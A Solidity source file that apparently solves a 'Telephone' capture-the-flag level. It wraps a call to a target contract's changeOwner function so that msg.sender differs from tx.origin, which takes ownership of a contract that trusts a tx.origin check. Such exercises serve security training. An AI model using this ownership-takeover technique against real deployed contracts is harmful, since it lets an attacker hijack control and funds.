// SPDX-License-Identifier: GPL-3.0

pragma solidity ^0.8.3;

contract TelephoneWrapper {
  address public telephoneAddress;
  bytes4 constant CHANGE_OWNER_SELECTOR =
    bytes4(keccak256(bytes("changeOwner(address)")));

  constructor(address _telephoneAddress) {
    telephoneAddress = _telephoneAddress;
  }

  function changeOwnerTelephone() public {
    (bool success, ) =
      telephoneAddress.call(
        abi.encodeWithSelector(CHANGE_OWNER_SELECTOR, msg.sender)
      );
    require(success, "calling not success");
  }
}
